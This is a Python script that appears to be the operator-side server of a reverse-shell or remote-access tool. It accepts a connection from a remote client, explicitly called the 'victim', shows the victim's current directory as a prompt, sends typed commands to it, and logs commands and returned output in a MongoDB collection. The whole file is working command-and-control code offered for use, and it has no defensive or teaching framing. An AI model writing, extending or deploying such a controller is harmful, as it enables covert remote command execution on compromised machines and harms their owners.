#!/usr/bin/env python3
import socket
import threading
import pymongo
import time
import signal
from sys import exit


class ServerTcp:

    def __init__(self, ip_server=socket.gethostname(), port=60555, db_link='mongodb://localhost:27017/',
                 db_name='my_ref_db', collection_name='data_got'):
        try:
            self.db_Client = pymongo.MongoClient(db_link)
            self.mydb = self.db_Client[db_name]
            self.mycol = self.mydb[collection_name]

            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            signal.signal(signal.SIGINT, signal.SIG_DFL)

            self.ip = ip_server
            self.port = port
            self.s.bind((self.ip, self.port))

        except (socket.error, Exception) as e:
            print("Error in connection", e)
            return

        self.s.listen(5)
        print("Ur server is running")
        self.start_conn()

    def test_connection(self):
        while True:
            time.sleep(2)
            try:
                self.client_socket.send("CHECKING CONNECTION".encode())
            except socket.error:
                self.connection = False

    def start_conn(self):
        """Function that waits for client connection."""

        print("\n[ Waiting For Client ]\n")
        self.client_socket, self.address = self.s.accept()
        print("client address : ", self.address)

        self.test_conn = threading.Thread(target=self.test_connection)
        self.test_conn.daemon = True
        self.test_conn.start()

        self.connection_open()

    def connection_open(self):
        """Interacting with the connection."""
        self.connection, get_victim_pwd, swap = True, True, ''

        while self.connection:
            if get_victim_pwd:
                get_victim_pwd = self.client_socket.recv(100).decode()
                swap = get_victim_pwd
            else:
                get_victim_pwd = swap
            msg = input(f"{get_victim_pwd} > ").strip()
            if msg in ['exit', 'get_op', 'get_last']:
                get_victim_pwd = False
            if msg == 'exit':  # Close the server
                exit(0)
            elif msg == "get_op":  # show the collection data.
                for i in self.mycol.find():
                    print(i['data'])
            elif msg == 'get_last':  # get last return of victim.
                print(self.mycol.find_one({'sender': 'client'}, sort=[('_id', pymongo.DESCENDING)])['data'])

            else:
                get_victim_pwd = True
                try:
                    self.client_socket.send(msg.encode())
                    self.mycol.insert_one({"data": msg, 'sender': 'SERVER'})
                    print("\n[[sent]]\n")

                except (socket.error, Exception):
                    print("Client Has Closed The Connection ..")
                    self.start_conn()

        return


while True:
    ServerTcp(port=50000)
    time.sleep(2)
